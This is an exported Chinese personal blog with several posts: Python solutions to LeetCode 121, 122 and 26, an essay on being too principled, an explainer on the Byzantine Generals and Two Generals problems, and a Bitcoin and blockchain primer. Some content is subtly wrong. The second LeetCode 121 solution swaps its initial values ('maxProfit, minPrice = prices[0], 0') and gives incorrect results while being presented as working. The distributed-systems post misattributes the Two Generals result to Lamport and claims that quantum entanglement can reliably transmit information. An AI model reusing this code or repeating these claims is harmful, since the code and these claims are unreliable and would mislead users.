<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [7,1,5,3,6,4]</div><div class="line">输出: 7</div><div class="line">解释: 在第 2 天（股票价格 = 1）的时候买入，在第 3 天（股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。</div><div class="line">     随后，在第 4 天（股票价格 = 3）的时候买入，在第 5 天（股票价格 = 6）的时候卖出, 这笔交易所能获得利润 = 6-3 = 3 。</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [1,2,3,4,5]</div><div class="line">输出: 4</div><div class="line">解释: 在第 1 天（股票价格 = 1）的时候买入，在第 5 天 （股票价格 = 5）的时候卖出, 这笔交易所能获得利润 = 5-1 = 4 。</div><div class="line">     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。</div><div class="line">     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 3:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [7,6,4,3,1]</div><div class="line">输出: 0</div><div class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　分析发现，可以使用取巧的方式来实现，因为这会违反“不能同一天买卖的规则”。假设输入是 [1, 2, 3]，本来应该是第 1 天买入，第 3 天卖出，利润是 3-1 = 2，但是，同时也可以第 1 天买入，第 2 天卖出，第 2 天又买入，第 3 天卖出，利润也是（2-1）+（3-2）= 2。也就是说，只要比较相邻两天的价格，如果当天价格比后一天价格低就买入，然后后一天卖出，得出这一次交易的利润，如果当天价格比后一天价格高，则跳过这一天，最后得出总的利润即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type prices: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        sum = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(prices) - <span class="number">1</span>):</div><div class="line">            <span class="keyword">if</span> prices[i] &gt;= prices[i + <span class="number">1</span>]:  <span class="comment"># 不交易的情况</span></div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                sum += prices[i + <span class="number">1</span>] - prices[i]  <span class="comment"># 加上本次交易的利润</span></div><div class="line">        <span class="keyword">return</span> sum  <span class="comment"># 输出总利润</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　先找到递减的局部最低点（即最佳买入点），再找到递增的局部最高点（最佳卖出点），算一次利润就加起来，保证买卖不会在同一天进行。基本思路就是寻找最佳买入点和卖出点，然后计算利润，再寻找下一次最佳买入点和卖出点，最后得到总的利润之和即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type prices: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        i = <span class="number">0</span></div><div class="line">        sum = <span class="number">0</span></div><div class="line">        length = len(prices)</div><div class="line">        <span class="keyword">while</span> i &lt; length - <span class="number">1</span>:</div><div class="line">            <span class="keyword">while</span> i &lt; length - <span class="number">1</span> <span class="keyword">and</span> prices[i] &gt; prices[i + <span class="number">1</span>]:  <span class="comment"># 寻找局部最佳买入点</span></div><div class="line">                i += <span class="number">1</span></div><div class="line">            buy = i</div><div class="line"></div><div class="line">            i += <span class="number">1</span></div><div class="line">            <span class="keyword">while</span> i &lt; length <span class="keyword">and</span> prices[i] &gt;= prices[i - <span class="number">1</span>]:  <span class="comment"># 寻找局部最佳卖出点</span></div><div class="line">                i += <span class="number">1</span></div><div class="line">            sell = i - <span class="number">1</span></div><div class="line"></div><div class="line">            sum += prices[sell] - prices[buy]  <span class="comment"># 加上每次的利润</span></div><div class="line">        <span class="keyword">return</span> sum</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 121. Best Time to Buy and Sell Stock</title>
    <url>/2018/12/10/LeetCode-121-Best-Time-to-Buy-and-Sell-Stock/</url>
    <content><![CDATA[<center>LeetCode 121. Best Time to Buy and Sell Stock 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Say you have an array for which the <em>i</em>th element is the price of a given stock on day <em>i</em>.</p>
<p>If you were only permitted to complete at most one transaction (i.e., buy one and sell one share of the stock), design an algorithm to find the maximum profit.</p>
<p>Note that you cannot sell a stock before you buy one.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个数组，它的第 <em>i</em> 个元素是一支给定股票第 <em>i</em> 天的价格。</p>
<p>如果你最多只允许完成一笔交易（即买入和卖出一支股票），设计一个算法来计算你所能获取的最大利润。</p>
<p>注意你不能在买入股票前卖出股票。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [7,1,5,3,6,4]</div><div class="line">输出: 5</div><div class="line">解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。</div><div class="line">注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格。</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: [7,6,4,3,1]</div><div class="line">输出: 0</div><div class="line">解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　常规思路：两层循环，第一层循环遍历价格数组（最后一个元素除外），第二层循环用于比较当前价格与其后的价格，如果大于当前价格则检查差值是否大于暂存的利润，如果是，则替换掉暂存的利润。最后，输出暂存的利润即为最大的利润。但是，提交后提示<strong>超时</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type prices: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        length = len(prices)</div><div class="line">        res = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length<span class="number">-1</span>):</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>, length):</div><div class="line">                <span class="keyword">if</span> prices[i] &lt; prices[j]:</div><div class="line">                    tmp = prices[j] - prices[i]</div><div class="line">                    <span class="keyword">if</span> res &lt; tmp:</div><div class="line">                        res = tmp</div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　使用一层循环，保证两点：（1）始终保存最小的买入价格。（2）始终保存最大的利润。这其中暗含的逻辑是，后面的数如果减 1 的差肯定比减 2 的差大。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span><span class="params">(self, prices)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type prices: List[int]</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        maxProfit, minPrice = prices[<span class="number">0</span>], <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(prices)):  <span class="comment"># 遍历价格数组</span></div><div class="line">            minPrice = min(minPrice, prices[i])  <span class="comment"># 保存最小的买入价格</span></div><div class="line">            maxProfit = max(maxProfit, prices[i] - minPrice)  <span class="comment"># 保存最大的利润</span></div><div class="line">        <span class="keyword">return</span> maxProfit</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>爱惜自己的羽毛</title>
    <url>/2018/12/10/%E7%88%B1%E6%83%9C%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BE%BD%E6%AF%9B/</url>
    <content><![CDATA[<center>谈谈对于“过于爱惜自己的羽毛”的看法。</center>

<a id="more"></a>
<p>　　鸟儿爱惜羽毛，因为羽毛不仅是华丽外表的基础还是飞翔的必备。人也像鸟儿爱惜羽毛一样爱惜名声，因为名声其实是一个人获得尊严的基础也可能是成功的关键。</p>
<p>　　最近突然明白，原则性强还真不一定是好事。在社会上，太有原则往往容易得罪人。回想自己经历过的一些事情，也觉得看透了很多问题的本质，所以，我也会觉得在合理的范围内去做一些事情，其实也没有什么。真正情商高的人，往往能够做到不违背原则而又不得罪人，而过于强调原则性，就是太爱惜自己羽毛的表现。</p>
<p>　　就像电视剧《人民的名义》里的达康书记，他勤政廉政、有改革开拓精神，对自己严格要求，但是人情世故比较淡薄，情商不是很高。在情感方面，李达康把所有精力都投入到了仕途上，妻子独自承担起了家庭的责任，感情上一直得不到李达康的慰藉。即使快离婚了，仍然没有办法从他那里获取好处。在友情方面，朋友王大路曾经为他在政治上承担过失辞官，虽然李达康也曾经私下予以资助，但是之后便刻意保持距离。在光明峰投资项目上，王大路反而因为他和李达康的关系无法中标。在同僚方面，易学习同样也曾经帮李达康拦下了政治责任，李达康却为了避嫌，不去提拔和推举易学习，同样也是担心影响自己的仕途。</p>
<p>　　现在回想起以前自己做的一些事情，也是太爱惜自己的羽毛。以前，我个人一直注重积累，崇尚厚积薄发，更在意那些实际的学识，那些终身受用的东西。也常常教育别人要这样做，不喜欢投机取巧的方式，总觉得做什么事情都应该凭借实力。但是，现实往往又不会给你这么长的积累时间，往往很多机会稍纵即逝。遇到一些事情，一些对于别人来说很重要的机会，本来可能就是举手之劳，但是思前想后觉得会影响到自己，也就不敢去做。这样做，虽然显得自己很有原则性，但是却也使得自己或者朋友没能抓住一些机会。而那些懂得如何去运作的人却抢占了先机，想想还是挺后悔的。如果当时可以尽力去帮别人一把，而不是首先把自己的利益放在前面；如果当时可以做出一些退让，或许别人的生活、甚至是人生轨迹可能都会不一样。可是，哪有那么多如果……</p>
<p>　　想想这些年，应该给很多人留下了太有原则的印象，所以也没有太多真正交心的朋友。现在的人都说，很多人活的越来越没有原则，而我又活的太有原则了。现如今，社会这个词现在都已经由名词演变成了形容词。我们常常会说某人很社会，虽然是带有调侃甚至是贬义的说法，但其实也是从侧面说明他情商高。在成年人的世界中，利益是人际关系的润滑剂，人际交往，讲究的互利共赢。过于爱惜自己的羽毛，就无法积累自己的人脉资源。在原则的红线之上，其实还有很多灰色的区域。有时候就需要自己做出适当的牺牲，来赢得他人支持和尊重。如何在不违背原则的基础上去帮助别人，这也是一门学问。</p>
<p>　　情商这个东西，还真是门大学问，需要很长时间的学习与培养。丢弃所谓的原则，并不意味着随波逐流，去迎合他人，而是合理地利用资源，为自己，为他人，尽力去做一些力所能及的事情。我相信，只要坚守初心，未来定不负我。所以，希望，以后我可以更好地处理一些事情，在不违背原则的情况下，尽力去为别人想想，能帮则帮。愿大家都好。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>拜占庭将军问题和两军问题</title>
    <url>/2018/12/08/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98%E5%92%8C%E4%B8%A4%E5%86%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<center>介绍区块链相关的拜占庭将军问题和两军问题。</center>

<a id="more"></a>
<h4 id="拜占庭将军问题"><a href="#拜占庭将军问题" class="headerlink" title="拜占庭将军问题"></a>拜占庭将军问题</h4><p>　　拜占庭将军问题（Byzantine Generals Problem），是由 Leslie Lamport 与另外两人于 1982 年在其同名论文中提出的分布式对等网络通信容错问题。</p>
<p>　　在分布式计算中，不同的计算机通过通讯交换信息达成共识而按照同一套协作策略行动。但有時候，系统中的成员计算机可能出错而发送错误的信息，用于传递信息的通讯网络也可能导致信息损坏，使得网络中不同的成员关于全体协作的策略得出不同结论，从而破坏系统一致性。拜占庭将军问题被认为是容错性问题中最难的问题类型之一。</p>
<p>　　一组拜占庭将军分别各率领一支军队共同围困一座城市。为了简化问题，将各支军队的行动策略限定为进攻或撤离两种。因为部分军队进攻部分军队撤离可能会造成灾难性后果，因此各位将军必须通过投票来达成一致策略，即所有军队一起进攻或所有军队一起撤离。因为各位将军分处城市不同方向，他们只能通过信使互相联系。在投票过程中每位将军都将自己投票给进攻还是撤退的信息通过信使分别通知其他所有将军，这样一来每位将军根据自己的投票和其他所有将军送来的信息就可以知道共同的投票结果而决定行动策略。</p>
<p>　　系统的问题在于，将军中可能出现叛徒，他们不仅可能向较为糟糕的策略投票，还可能选择性地发送投票信息。假设有9位将军投票，其中1名叛徒。8名忠诚的将军中出现了4人投进攻，4人投撤离的情况。这时候叛徒可能故意给4名投进攻的将领送信表示投票进攻，而给4名投撤离的将领送信表示投撤离。这样一来在4名投进攻的将领看来，投票结果是5人投进攻，从而发起进攻；而在4名投撤离的将军看来则是5人投撤离。这样各支军队的一致协同就遭到了破坏。<br>　　<br>　　由于将军之间需要通过信使通讯，叛变将军可能通过伪造信件来以其他将军的身份发送假投票。而即使在保证所有将军忠诚的情况下，也不能排除信使被敌人截杀，甚至被敌人间谍替换等情况。因此很难通过保证人员可靠性及通讯可靠性来解决问题。Lamport 已经证明了在消息可能丢失的不可靠信道上试图通过信息传递的方法达成一致性是不可能的。所以在研究拜占庭将军问题的时候我们假定信道是没有问题的，并在这个前提下去做移植性和容错性的相关研究。</p>
<p>　　假始那些忠诚（或是没有出错）的将军仍然能通过多数决定来决定他们的战略，便称达到了拜占庭容错。在此，票都会有一个默认值，若消息（票）没有被收到，则使用此默认值来投票。</p>
<p>　　拜占庭将军问题是一个共识问题，由此引申到计算领域，发展成了一种容错理论。拜占庭将军问题可以理解为在一个去中心的系统中，有一些节点是坏掉的，它们可能向外界广播错误的信息或者不广播信息，在这种情况下如何验证数据传输的准确性。</p>
<p>　　达成共识并非坐下来开个会那么简单，有的将军心机深不可测，口是心非，如果有叛徒，可能会出现各种问题：</p>
<ul>
<li>叛徒可能欺骗某些将军自己将采取进攻行动。</li>
<li>叛徒可能怂恿其他将军行动。</li>
<li>叛徒可能迷惑其他将军，使他们接受不一致的信息，从而感到迷惑。</li>
</ul>
<p>　　针对拜占庭问题的深入研究，科学家们提出拜占庭容错算法（PBFT）中，得出结论：<strong>如果叛徒的数量大于或等于1/3，拜占庭问题不可解。</strong>也就是说，在经典情形下，拜占庭将军问题是有解的，只要叛徒少于三分之一，忠诚的将军们就一定能达成一致结果，实现拜占庭容错。<br>　　<br>　　随着比特币和区块链技术的出现和兴起，这个著名问题又重入大众视野。区块链解决了拜占庭将军问题，其思路是如果要做叛徒，就付出相应的成本，而付出这个成本还不如诚实地维护这个系统利益来得大。区块链技术中的共识算法有多种，后续再详细介绍。<br>　　<br>　　这里我们以 PoW（Proof of Work）工作量共识机制为例，在PoW机制下，成本就是要掌握整个网络50%以上的算力——换句话说，有50%以上的叛徒才行，这是比PBFT高得多的容错率。可是，如果真的掌握那么大的算力的话，用这些算力维护网络获得的收益其实会高于破坏网络。当然，PoW机制也有缺陷，比如浪费了大量的算力以及产生这些算力的电、计算设备等。</p>
<h4 id="两军问题"><a href="#两军问题" class="headerlink" title="两军问题"></a>两军问题</h4><p>　　如上所述，拜占庭将军问题中并不是去考虑信使是否会被截获或者无法传递信息等问题。如果需要考虑信道是有问题的，这就涉及到另一个问题——<strong>两军问题</strong>。<br>　　<br>　　学过计算机专业的人应该在计算机网络的课程中听过这个故事。两军问题讲的是如下图的情景，白军驻扎在沟渠里，蓝军则分散在沟渠两边。白军比任何一支蓝军都更为强大，但是蓝军若能同时合力进攻则能够打败白军。他们不能够远程的沟通，只能派遣通信兵穿过沟渠去通知对方蓝军协商进攻时间。是否存在一个能使蓝军必胜的通信协议，这就是两军问题。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/8-1.png" alt="8-1"></p>
<p>　　看到这里您可能发现两军问题和拜占庭将军问题有一定的相似性，但我们必须注意的是，通信兵得经过敌人的沟渠，在这过程中他可能被捕，也就是说，两军问题中信道是不可靠的，并且其中没有叛徒之说，这就是两军问题和拜占庭将军问题的根本性不同。<br>　　<br>　　假设一支蓝军指挥官发出消息：“我建议在明天佛晓发起进攻，请确认。”如果消息到达了另一支蓝军，其指挥官同意这一建议，并且他的回信也安全的送到，那么能否进攻呢？不能。这是一个两步握手协议，因为该指挥官无法知道他的回信是否安全送到了，所以，他不能发起进攻，改进协议，将两步握手协议改为三步握手协议，这样，最初提出建议的指挥官必须确认对该建议的应答信息。</p>
<p>　　假如信息没有丢失，并收到确认消息，则他必须将收到的确认信息告诉对方，从而完成三步握手协议。然而，这样他就无法知道消息是否被对方收到，因此，他不能发起进攻。那么现在采用四步握手协议会如何呢？结果仍是于事无补。<br>　　<br>　　由此可见，经典情形下，两军问题是不可解的，不存在使蓝军必胜的通信约定（协议），即白军和蓝军是无法通过信息沟通达成行动上的一致。在这种情况下，因为是点对点的通信，双方不可能在这种情况下达到信息的一致性。严谨一点，就是“在分布式计算上，试图在异步系统和不可靠的通道上达到一致性是不可能的”。</p>
<p>　　虽然两军问题经典情形下不可解，但是这一问题至关重要，是现代通信系统中必须解决的问题。TCP协议的三次握手被作为“解决”两军问题的主流方案，但是并不能够彻底解决两军问题，只是在现实成本可控的条件下，把TCP协议当作了两军问题的现实可解方法。</p>
<p>　　而区块链技术使用非对称加密算法对节点间的消息传递提供签名技术支持，极大程度上杜绝了信息被篡改、被监听的可能性，但仍然无法完全杜绝。<br>　　<br>　　从目前的科研成果来看，量子通讯协议很有可能成为两军问题的终极解决方案。量子通讯协议的基础是量子纠缠理论：处于量子纠缠态的两个粒子，无论相隔多远都能够彼此同步。<br>　　<br>　　因此，理论上两军问题还是可解的，即存在一种方法，即使利用了不可靠的信道，也能保证信息传递的可靠性。</p>
]]></content>
      <categories>
        <category>Distributed</category>
      </categories>
      <tags>
        <tag>Distributed system</tag>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>初识-比特币与区块链</title>
    <url>/2018/12/06/%E5%88%9D%E8%AF%86-%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    <content><![CDATA[<center>比特币与区块链简介。</center>

<a id="more"></a>
<h4 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>　　比特币（Bitcoin，缩写BTC）是一种总量恒定为 2100 万的数字货币，它采用 P2P 形式的，和互联网一样具有<strong>去中心化、全球化、匿名性</strong>等特性。在 2008 年 11 月，一个化名为中本聪的人在一篇“比特币：一种点对点的电子现金系统”论文中，描述了一种如何建立一套全新的、去中心化的点到点交易系统的方法，并将他在论文中提出的理念付诸实践，着手开发比特币的发行、交易和账户管理系统。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/6-1.jpg" alt="6-1"></p>
<p>　　向世界上任何地方转账比特币，就像发送电子邮件一样简单，低成本，无任何限制。比特币因此被用于跨境贸易、支付、汇款等领域，具有什么广阔的前景，同时，也衍生出了许多其他的数字货币币种。</p>
<h5 id="挖矿"><a href="#挖矿" class="headerlink" title="挖矿"></a>挖矿</h5><p>　　谈起比特币，就不得不说到挖矿。挖矿，专业解释是计算机 Hash（哈希或散列函数）随机碰撞的过程。简单来说，就是<strong>比特币系统出一道数学题，看谁家挖矿设备先有解。</strong>本质上就是求解数学题，但是这个数学题的求解不是靠技巧，而就是直接使用暴力破解。</p>
<p>　　虽说挖矿是概率事件，拥有更大算力的矿工不是每次都能最快得到正解。这也就造就了不同计算机计算能力（简称算力）之间的较量。<strong>拥有更大算力计算机／挖矿机的矿工，获得的收益越大。</strong>当然，每个矿工付出的劳动量是不同的，这个在比特币里就叫工作量（POW）不同。工作量越大的，自然就有更高的几率获得奖励。这个也是非常公平的。为了提高工作量，你会更新你的设备，或者买入更多矿机，来提升算力。</p>
<p>　　挖矿获得的比特币奖励分两部分，一部分是最初的那 2100 万比特币，一开始被矿工挖出来，然后拿到交易所去卖掉，才流动起来。另一部分是你在给别人转比特币时，支付的手续费。如果有一天，2100 万个比特币都被挖出来了，那么这以后，矿工再获得的奖励就都是手续费。</p>
<h5 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h5><p>　　比特币由于广阔的前景和巨大的遐想空间，自 2009 年诞生后价格持续上涨，2011 年币价达到 1 美元，2013 年最高达到 1200 美元，超过 1 盎司黄金价格，有“数字黄金”的美称。2017 年全年比特币最低价位是 789 美元，对应日期为 1 月 11 日，最高价位为 18674 美元（目前也是历史记录最高价位），对应日期是 12 月 18 日。比特币货币市场在 2017 年辉煌一时，但 2018 年市场表现并不理想，受多方政策影响，比特币价格开始大幅度下跌，这一年跌幅超 8 成。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/6-2.png" alt="6-2"></p>
<h5 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h5><ul>
<li>洗钱。比特币以其复杂的流水与无纸化隐蔽的形式深受黑市青睐。但是，近年来各国对于比特币的监管也逐步加大，开始打击涉及数字货币洗钱的行为。</li>
<li>金融战争。可以成为金融资本快速进出一个国家的工具。通过比特币转移资本，完全可以对一个国家发动金融战争；</li>
<li>黑客勒索支付。2017 年，一种锁死电脑的恶意软件正在世界各地迅速传播，目前已经有近百个国家和地区的数万台电脑遭到攻击。黑客将电脑中的资料文档上锁，并要求支付300美金等价的比特币才能解锁文件。</li>
<li>比特币的稀缺性及隐秘性注定了它的价值，未来可成为衡量其它虚拟币价值的尺码或工具，但成不了货币（货币的广泛使用性和易用流通性限制了比特币成为货币的可能）。</li>
</ul>
<h4 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h4><p>　　区块链技术是指一种全民参与记账的方式。所有的系统背后都有一个数据库，你可以把数据库看成是就是一个大账本。目前是各自记各自的账。</p>
<h5 id="P2P-网络"><a href="#P2P-网络" class="headerlink" title="P2P 网络"></a>P2P 网络</h5><p>　　P2P（Peer-to-Peer）网络是一种端到端的网络，分为结构化和非结构化的 P2P 网络。想当年快播也是 P2P 模式，只是时势造英雄，英雄造时势，英雄一去不复还。但是，P2P 模式的优势使得其现在依然被广泛应用，例如迅雷、P2P 金融以及比特币。</p>
<p>　　比特币的区块链采用的是非结构化 P2P 网络，整个网络没有中心化的硬件或管理机构，任一节点既是服务端，也是客户端。任何节点只要安装相应的客户端软件，就能接入 P2P 网络，参与区块链的记录和验证，不超过 1/3 节点的损坏、退出甚至被植入恶意代码，都不会影响整个系统的运作。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/6-3.png" alt="6-3"></p>
<h5 id="中心化集中式模式"><a href="#中心化集中式模式" class="headerlink" title="中心化集中式模式"></a>中心化集中式模式</h5><p>　　在某宝购物的交易流程是：下单 - 支付订单金额给某宝 - 收款后通知卖家发货－卖家发货－你确认收货－某宝把钱打给卖家。在这个过程中，虽然你是在和卖家交易，但是这笔交易还牵扯到了第三方某宝，你和卖家的交易都是围绕某宝平台展开。这就是一种集中式的交易模式，你和卖家的交易需要经过某宝，并且所有信息某宝都是可以得到的。如果某宝系统出了问题便会造成这笔交易的失败，另外，考虑极端情况，某宝可能跑路了或者是拿了钱不却不承认你的交易。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/6-4.jpg" alt="6-4"></p>
<p>　　再看看现在的银行，也是中心化账本的方式，账本存储在银行的中心数据库，里面记录了储户的账号余额。如果要转帐，都必须向银行提交申请，然后银行修改数据库中对应的信息。</p>
<h5 id="去中心化"><a href="#去中心化" class="headerlink" title="去中心化"></a>去中心化</h5><p>　　去中心化是区块链技术的颠覆性特点，它无需中心化代理，实现了一种点对点的直接交互，使得高效率、大规模、无中心化代理的信息交互方式成为了现实。</p>
<p>　　上面在某宝购物的例子如果采用去中心化的处理方式就要显得简单很多，你只需要和卖家交换钱和商品，然后双方都声称完成了这笔交易，就 OK 了。可以看出在某些特定情况下，去中心化的处理方式会更便捷，同时也无须担心自己的与交易无关的信息泄漏。但是，如果只考虑两个人的交易并不能把去中心化的好处完全展示出来，设想如果有成千上万笔交易在进行，去中心化的处理方式会节约很多资源，使得整个交易自主化、简单化，并且排除了被中心化代理控制的风险。</p>
<p>　　那么分布式账本又是什么样的呢？大家不需要银行，而是自己用账本来记录谁有多少钱，每个人的账本上都写着所有的信息。当转帐时，需向所有人宣告，一传十十传百，直到所有人都知道这笔转账，以此保证所有人账本的一致性。当然，其中其中还有很多的问题需要解决，区块链技术设计了一些机制去解决这些问题。</p>
<h5 id="核心技术"><a href="#核心技术" class="headerlink" title="核心技术"></a>核心技术</h5><ul>
<li><strong>账户与交易模型</strong></li>
</ul>
<p>　　区块链的交易就是构成区块的基本单位，也是区块链负责记录的实际有效内容。一个区块链交易可以是一次转账，也可以是智能合约的部署等其他事务。</p>
<ul>
<li><strong>分布式账本</strong></li>
</ul>
<p>　　交易记账由分布在不同地方的多个节点共同完成，而且每一个节点都记录的是完整的账目，因此它们都可以参与监督交易合法性，同时也可以共同为其作证。</p>
<ul>
<li><strong>加密算法和数字签名</strong></li>
</ul>
<p>　　存储在区块链上的交易信息是公开的，但是账户身份信息是高度加密的，只有在数据拥有者授权的情况下才能访问到，从而保证了数据的安全和个人的隐私。</p>
<ul>
<li><strong>共识机制</strong></li>
</ul>
<p>　　所有记账节点之间怎么达成共识，去认定一个记录的有效性，这既是认定的手段，也是防止篡改的手段。区块链提出了四种不同的共识机制，适用于不同的应用场景，在效率和安全性]之间取得平衡。</p>
]]></content>
      <categories>
        <category>Distributed</category>
      </categories>
      <tags>
        <tag>比特币</tag>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 26. Remove Duplicates from Sorted Array</title>
    <url>/2018/12/05/LeetCode-26-Remove-Duplicates-from-Sorted-Array/</url>
    <content><![CDATA[<center>LeetCode 26. Remove Duplicates from Sorted Array 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li>英文</li>
</ul>
<p>Given a sorted array <em>nums</em>, remove the duplicates <a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="external"><strong>in-place</strong></a> such that each element appear only <em>once</em> and return the new length.</p>
<p>Do not allocate extra space for another array, you must do this by <strong>modifying the input array in-place</strong> with O(1) extra memory.</p>
<ul>
<li>中文</li>
</ul>
<p>给定一个排序数组，你需要在<strong>原地</strong>删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度。</p>
<p>不要使用额外的数组空间，你必须在<strong>原地修改输入数组</strong>并在使用 O(1) 额外空间的条件下完成。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">给定数组 nums = [1,1,2], </div><div class="line"></div><div class="line">函数应该返回新的长度 2, 并且原数组 nums 的前两个元素被修改为 1, 2。 </div><div class="line"></div><div class="line">你不需要考虑数组中超出新长度后面的元素。</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">给定 nums = [0,0,1,1,1,2,2,3,3,4],</div><div class="line"></div><div class="line">函数应该返回新的长度 5, 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4。</div><div class="line"></div><div class="line">你不需要考虑数组中超出新长度后面的元素。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1：</strong></li>
</ul>
<p>　　类似于第27题. Remove Element，我们使用游标 i 从下标为 1 的元素开始遍历，另外，使用游标 j 来记录已经结果数组的元素。依次检查 i 所指的元素是否与前一个元素相等，如果是则检查下一个元素，否则，将其记录到 j 所指的位置，然后 j 往后移一位准备记录下一个。重复上述过程直到遍历结束。 </p>
